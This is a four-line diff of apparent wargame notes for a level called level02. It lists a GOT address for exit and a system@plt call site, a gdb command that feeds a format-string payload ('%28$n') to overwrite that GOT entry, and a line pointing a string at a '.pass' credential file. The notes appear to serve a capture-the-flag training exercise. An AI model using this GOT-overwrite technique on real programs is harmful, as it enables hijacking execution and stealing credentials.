@@ -1,0 +1,4 @@
+exit@got.plt = 0x601228
+address before <system@plt> call = 0x400a85
+r < <(python -c 'print "\x28\x12\x60\x00 %28$n"')
+set {char[26]} 0x400bb2 = "/home/users/level02/.pass"
